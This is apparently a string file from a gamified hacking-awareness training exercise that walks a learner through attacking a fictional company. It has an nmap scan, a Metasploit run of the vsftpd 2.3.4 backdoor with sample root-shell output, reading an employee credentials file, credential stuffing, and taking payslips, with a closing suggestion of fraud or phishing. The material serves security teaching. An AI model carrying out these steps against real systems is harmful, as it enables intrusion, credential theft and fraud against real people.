8275-42ae.title: Explore the target
8275-42ae.description: The very first step is to explore the target by simply going to their website.

7837-42ae-a1af.instruction: Open Google Chrome <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><linearGradient id="b" x1="55.41" x2="12.11" y1="96.87" y2="21.87" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1e8e3e"/><stop offset="1" stop-color="#34a853"/></linearGradient><linearGradient id="c" x1="42.7" x2="86" y1="100" y2="25.13" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fcc934"/><stop offset="1" stop-color="#fbbc04"/></linearGradient><linearGradient id="a" x1="6.7" x2="93.29" y1="31.25" y2="31.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#d93025"/><stop offset="1" stop-color="#ea4335"/></linearGradient><path fill="url(#a)" d="M93.29 25a50 50 90 0 0-86.6 0l3 54z"/><path fill="url(#b)" d="M28.35 62.5 6.7 25A50 50 90 0 0 50 100l49-50z"/><path fill="url(#c)" d="M71.65 62.5 50 100a50 50 90 0 0 43.29-75H50z"/><path fill="#fff" d="M50 75a25 25 90 1 0 0-50 25 25 90 0 0 0 50z"/><path fill="#1a73e8" d="M50 69.8a19.8 19.8 90 1 0 0-39.6 19.8 19.8 90 0 0 0 39.6z"/></svg>
7837-42ae-a1af.explaination: You can find the icon <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><linearGradient id="b" x1="55.41" x2="12.11" y1="96.87" y2="21.87" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1e8e3e"/><stop offset="1" stop-color="#34a853"/></linearGradient><linearGradient id="c" x1="42.7" x2="86" y1="100" y2="25.13" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fcc934"/><stop offset="1" stop-color="#fbbc04"/></linearGradient><linearGradient id="a" x1="6.7" x2="93.29" y1="31.25" y2="31.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#d93025"/><stop offset="1" stop-color="#ea4335"/></linearGradient><path fill="url(#a)" d="M93.29 25a50 50 90 0 0-86.6 0l3 54z"/><path fill="url(#b)" d="M28.35 62.5 6.7 25A50 50 90 0 0 50 100l49-50z"/><path fill="url(#c)" d="M71.65 62.5 50 100a50 50 90 0 0 43.29-75H50z"/><path fill="#fff" d="M50 75a25 25 90 1 0 0-50 25 25 90 0 0 0 50z"/><path fill="#1a73e8" d="M50 69.8a19.8 19.8 90 1 0 0-39.6 19.8 19.8 90 0 0 0 39.6z"/></svg> in the bottom left corner.

7837-42ae-4e0c.explaination: Go to the page "portal.home247.com" using Google Chrome. (Self note change page)

7837-42ae-12p0.instruction: Try to log in using tdp@pia.dk
7837-42ae-12p0.explaination: It seems like PIA is using a large software company for their internal services, it is probably too well protected for us to get in without a password. Let's move on for now.

8275-ad69.title: Explore alternative targets
8275-ad69.description: It seems that PIA still has an old system running. A so called legacy system.

7837-ad69-9da1.instruction: Visit the page of the old system
7837-ad69-9da1.explaination: The login page from before has a link in the bottom right corner.

8275-ba67.title: Investigate your Target
8275-ba67.description: Unfortunately you don't have any login information for this system either. Let's investigate the target and see if there are any potential vulnerabilities.

7837-ba67-81df.instruction: Open the Terminal <svg version="1.1" viewBox="0 0 29.633 27.517" xmlns="http://www.w3.org/2000/svg"><g transform="translate(-432.71 -142.72)"><g><rect x="432.71" y="142.72" width="29.633" height="26.458" rx="2.1167" ry="2.0957" enable-background="new" fill="#d2d8dc" style="paint-order:normal"/><rect x="434.82" y="144.84" width="25.4" height="22.225" rx="1.1125" ry=".99875" enable-background="new" fill="#263742" style="paint-order:normal"/><path d="m432.71 167.07v1.0583c0 1.1726 0.94404 2.1167 2.1167 2.1167h25.4c1.1726 0 2.1167-0.94404 2.1167-2.1167v-1.0583c0 1.1726-0.94404 2.1167-2.1167 2.1167h-25.4c-1.1726 0-2.1167-0.94403-2.1167-2.1167z" enable-background="new" fill="#758087" style="paint-order:normal"/><g transform="matrix(.24902 0 0 .26458 429.47 93.247)" enable-background="new" fill="#f1f3f5"><path d="m42.75 211-12.75-7.7282v4.7282l8.5 5-8.5 5v4.7282l12.75-7.7282z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/><path d="m47 227 2e-6 4h17l-2e-6 -4z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/></g></g></g></svg>
7837-ba67-81df.explaination: Next to the start button (in the bottom left corner) you can start the terminal <svg version="1.1" viewBox="0 0 29.633 27.517" xmlns="http://www.w3.org/2000/svg"><g transform="translate(-432.71 -142.72)"><g><rect x="432.71" y="142.72" width="29.633" height="26.458" rx="2.1167" ry="2.0957" enable-background="new" fill="#d2d8dc" style="paint-order:normal"/><rect x="434.82" y="144.84" width="25.4" height="22.225" rx="1.1125" ry=".99875" enable-background="new" fill="#263742" style="paint-order:normal"/><path d="m432.71 167.07v1.0583c0 1.1726 0.94404 2.1167 2.1167 2.1167h25.4c1.1726 0 2.1167-0.94404 2.1167-2.1167v-1.0583c0 1.1726-0.94404 2.1167-2.1167 2.1167h-25.4c-1.1726 0-2.1167-0.94403-2.1167-2.1167z" enable-background="new" fill="#758087" style="paint-order:normal"/><g transform="matrix(.24902 0 0 .26458 429.47 93.247)" enable-background="new" fill="#f1f3f5"><path d="m42.75 211-12.75-7.7282v4.7282l8.5 5-8.5 5v4.7282l12.75-7.7282z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/><path d="m47 227 2e-6 4h17l-2e-6 -4z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/></g></g></g></svg>, (also known as the command-line). The terminal might look intimidiating, but it is just a different way of interacting with a computer. The steps below will guide you.

7837-ba67-11ec.description: Let scan the server for any connection to the internet. For this we're using a tool called NMAP. NMAP will specify what software made those connections.
7837-ba67-11ec.explaination: Type nmap -sV drives.pia.dk in the terminal (the black window), and hit enter. The current date and time will appear, and after a few seconds the results of the scan will appear.

7837-ba67-65ae.description: Good job, you have managed to scan the target, lets take a look at the results.
7837-ba67-65ae.explaination: The results show that there are three open ports, two from NGINX which is used to host a website, and an VSFTPD service which is used for file transfers. NMAP also displays the version numbers.

dialog.body:
/nmap -sV drives.pia.dk

Starting Nmap 7.80 ( https://nmap.org ) at [DATE]

Nmap scan report for drives.pia.dk (172.X.X.X) < The start of the results

Host is up (0.XXXXs latency).< Result 1: The target is online (connected to the internet)

rDNS record for 172.X.X.X: pia-legacy.com< Result 2: The IP Address and main domain of the server

Not shown: 997 closed ports < Result 3: Out of 1000 ports, 997 were not used by any software

PORT     STATE SERVICE   VERSION < Result 4: Open ports (connections) found, and their use

21/tcp   open  ftp       vsftpd 2.3.4Port 21 is used for an FTP application (file transfers)

80/tcp   open  http      nginx  1.18.0Port 80 is used for an http application (web pages)

443/tcp  open  ssl/http  nginx  1.18.0Port 443 is used for an https service (secure webpages)

Service Info: OS: Unix

Service detection performed ...
...

/

7837-cb44-81df.instruction: Open another terminal <svg version="1.1" viewBox="0 0 29.633 27.517" xmlns="http://www.w3.org/2000/svg"><g transform="translate(-432.71 -142.72)"><g><rect x="432.71" y="142.72" width="29.633" height="26.458" rx="2.1167" ry="2.0957" enable-background="new" fill="#d2d8dc" style="paint-order:normal"/><rect x="434.82" y="144.84" width="25.4" height="22.225" rx="1.1125" ry=".99875" enable-background="new" fill="#263742" style="paint-order:normal"/><path d="m432.71 167.07v1.0583c0 1.1726 0.94404 2.1167 2.1167 2.1167h25.4c1.1726 0 2.1167-0.94404 2.1167-2.1167v-1.0583c0 1.1726-0.94404 2.1167-2.1167 2.1167h-25.4c-1.1726 0-2.1167-0.94403-2.1167-2.1167z" enable-background="new" fill="#758087" style="paint-order:normal"/><g transform="matrix(.24902 0 0 .26458 429.47 93.247)" enable-background="new" fill="#f1f3f5"><path d="m42.75 211-12.75-7.7282v4.7282l8.5 5-8.5 5v4.7282l12.75-7.7282z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/><path d="m47 227 2e-6 4h17l-2e-6 -4z" style="font-feature-settings:normal;font-variant-caps:normal;font-variant-ligatures:normal;font-variant-numeric:normal"/></g></g></g></svg>
7837-cb44-81df.explaination: Just as earlier open a terminal to execute your commands.

7837-cb44-11ec.explaination: Type msfconsole in the terminal, and hit enter, wait for a minute and then metasploit will open in the terminal. When you see msf6 >

7837-cb44-40f0.explaination: Type search vsftpd into the terminal next to msf6 > and hit enter. We'll be using the results from before. By executing this command, we search for any known vulnerabilities and exploits for the VSFTPD software.

7837-cb44-51tg.explaination: Type the command (use 0) and hit enter, this will select the result found before with ID 0.

7837-cb44-88pa.explaination: This will tell metasploit that drives.pia.dk is our target.

7837-cb44-21rz.explaination: With this command, metasploit will perform a sequence of actions that is known to have an effect on this version of the software. This might take a minute, after this you will have access to the server. (Malicious laughter).

7837-cb44-41ad.instruction: Wait for Metasploit to conduct the exploit...
7837-cb44-41ad.explaination: When it says "Command shell session 1 opened..." then the exploit was succesfull and you can move to next step.

dialog.title: Example
dialog.body:
Below is a

/msfconsole

[*] Starting the Metasploit Framework Console .../

...

search vsftpd

Matching Modules
================

#  Name                                  Disclosure Date  Rank       Check  
-  ----                                  ---------------  ----       ----  
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

use 0

[*] No payload configured, defaulting to cmd/unix/interact

exploit(unix/ftp/vsftpd_234_backdoor) set RHOSTS drives.pia.dk

rhosts => drives.pia.dk

exploit(unix/ftp/vsftpd_234_backdoor) exploit

[*] 172.X.X.X:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.X.X.X:21 - USER: 331 Please specify the password.
[+] 172.X.X.X:21 - Backdoor service has been spawned, handling...
[+] 172.X.X.X:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[+] 172.X.X.X:21 - Found shell.
[+] 172.X.X.X:21 - Command shell session 1 opened (172.X.X.X:xxxx -> 172.X.X.X:6200) at [DATE]

8275-dn31.title: Explore the server
8275-dn31.description: We now have access to the server. Even though not much seems to have changed on your screen. The terminal that showed metasploit before is now directly connected to the server and can do anything that a terminal running on that server could.

7837-dn31-72df.description: Lets explorer the content of the server.
7837-dn31-72df.explaination: Type ls and press enter. This command is used to make a list of all files/folders in the current directory.

7837-dn31-53qt.explaination: Type cd data and press enter. When using the command cd followed by a folder name, you navigate to the folder specified. Afterwards reusing the command ls it is possible to see what's inside this folder.

7837-dn31-87be.explaination: Just like before we go into a new folder. This time it's the employees folder.

7837-dn31-12ty.explaination: We are checking the content of this folder to see if it's containing any files we might find useful

7837-dn31-08xc.explaination: Type cat employees.json and press enter. This comamnd reveals the content of the file specified (in this case 'employees.json').

8275-en12.title: Analyze results
8275-en12.description: Amazing you've managed to find a file, with personel data. It seem like passwords and usernames. They might be old but let's save them for later anyways.

7837-en12-72df.explaination: It seems like all the passwords are randomly choosen... Besides the one from JCD, we might be able to use that for later.

8275-fr56.title: Leave the crime scene
8275-fr56.description: Great job, you've managed to hack the system and gain helpful information. Now let's leave the server.

7837-fr56-72df.description: Before you leave the hacked server feel free to look around and see if there is anything else of interest. Remember to use the ls command to see content in the folder and cd to navigate around. If you ever need to go back you can type cd ..
7837-fr56-72df.instruction: When you're ready to leave, execute exit
7837-fr56-72df.explaination: When executing the command you will close the connection to the server and return to Metasploit.

8275-gm12.title: Explore the target
8275-gm12.description: Lets go back to the target from last challenge.

7837-gm12-72df.instruction: Open Google Chrome <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><linearGradient id="b" x1="55.41" x2="12.11" y1="96.87" y2="21.87" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1e8e3e"/><stop offset="1" stop-color="#34a853"/></linearGradient><linearGradient id="c" x1="42.7" x2="86" y1="100" y2="25.13" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fcc934"/><stop offset="1" stop-color="#fbbc04"/></linearGradient><linearGradient id="a" x1="6.7" x2="93.29" y1="31.25" y2="31.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#d93025"/><stop offset="1" stop-color="#ea4335"/></linearGradient><path fill="url(#a)" d="M93.29 25a50 50 90 0 0-86.6 0l3 54z"/><path fill="url(#b)" d="M28.35 62.5 6.7 25A50 50 90 0 0 50 100l49-50z"/><path fill="url(#c)" d="M71.65 62.5 50 100a50 50 90 0 0 43.29-75H50z"/><path fill="#fff" d="M50 75a25 25 90 1 0 0-50 25 25 90 0 0 0 50z"/><path fill="#1a73e8" d="M50 69.8a19.8 19.8 90 1 0 0-39.6 19.8 19.8 90 0 0 0 39.6z"/></svg> or use the same window as before.
7837-gm12-72df.explaination: You can find the icon <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><linearGradient id="b" x1="55.41" x2="12.11" y1="96.87" y2="21.87" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1e8e3e"/><stop offset="1" stop-color="#34a853"/></linearGradient><linearGradient id="c" x1="42.7" x2="86" y1="100" y2="25.13" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fcc934"/><stop offset="1" stop-color="#fbbc04"/></linearGradient><linearGradient id="a" x1="6.7" x2="93.29" y1="31.25" y2="31.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#d93025"/><stop offset="1" stop-color="#ea4335"/></linearGradient><path fill="url(#a)" d="M93.29 25a50 50 90 0 0-86.6 0l3 54z"/><path fill="url(#b)" d="M28.35 62.5 6.7 25A50 50 90 0 0 50 100l49-50z"/><path fill="url(#c)" d="M71.65 62.5 50 100a50 50 90 0 0 43.29-75H50z"/><path fill="#fff" d="M50 75a25 25 90 1 0 0-50 25 25 90 0 0 0 50z"/><path fill="#1a73e8" d="M50 69.8a19.8 19.8 90 1 0 0-39.6 19.8 19.8 90 0 0 0 39.6z"/></svg> in the bottom left corner.

7837-gm12-12df.explaination: Go to the page sharedot.com using Google Chrome

7837-gm12-83vs.instruction: Try to log in using one of the earlier found usernames...
7837-gm12-83vs.explaination: Remember, that you have saved the file with usernames to the desktop earlier.

8275-hu99.title: Password stuffing
8275-hu99.description: During the intro you learned about different ways of attacks towards passwords. Let's use password stuffing to try to breach the file. Remember Password stuffing involves using else where found credentials and try to stuff them into the system.

7837-hu99-72df.instruction: Try to see if you can log in using any of the found users. Try SMF or VLA.
7837-hu99-72df.explaination: If you're not successfull go to next step.

8275-io91.title: Creative Password stuffing
8275-io91.description: When password stuffing the successrate is often very low, but luckily you only need to be lucky once.

7837-io91-69xx.explaination: If you've already tried to login using JCD, then check the box of and go to next step

7837-io91-43ma.instruction: Try to login in with a password using a similar pattern
7837-io91-43ma.explaination: People, and in this case JCD, often create passwords following specific patterns. Try type a password which would match the password found with current information.

8275-ja55.title: Explore sharedot.com
8275-ja55.description: Great you managed to get in! Let's see what we can find of files on the internal drives.

7837-ja55-72df.instruction: Navigate around on the server and see what you can find.
7837-ja55-72df.explaination: You can see the folders on the left and the files, if any on the right. Simply click on them to navigate around. When you feel ready move to next task.

8275-kq31.title: Let's find the personel files
8275-kq31.description: Unless, you haven't already found them. Let's find the payslip files.

7837-kq31-51aw.description: The HR folder seems like the one with highest possibility of containing the files we are looking for.
7837-kq31-51aw.instruction: Go to the HR folder <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M512 144v288c0 26.5-21.5 48-48 48h-416C21.5 480 0 458.5 0 432v-352C0 53.5 21.5 32 48 32h160l64 64h192C490.5 96 512 117.5 512 144z"/></svg>
7837-kq31-51aw.explaination: Click on the HR folder  in the left panel

7837-kq31-65vd.description: The folder contains a temp folder. This indicates its a temporary folder, which probably is going to be deleted at some point.
7837-kq31-65vd.instruction: Go to the Temp folder <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M512 144v288c0 26.5-21.5 48-48 48h-416C21.5 480 0 458.5 0 432v-352C0 53.5 21.5 32 48 32h160l64 64h192C490.5 96 512 117.5 512 144z"/></svg>
7837-kq31-65vd.explaination: Click on the Temp folder in the left panel

8275-lm67.title: Great you found the payslips!
8275-lm67.description: You managed to get the information you were looking for and can now use this information to anything you want! E.g. fraud, phising email, etc.
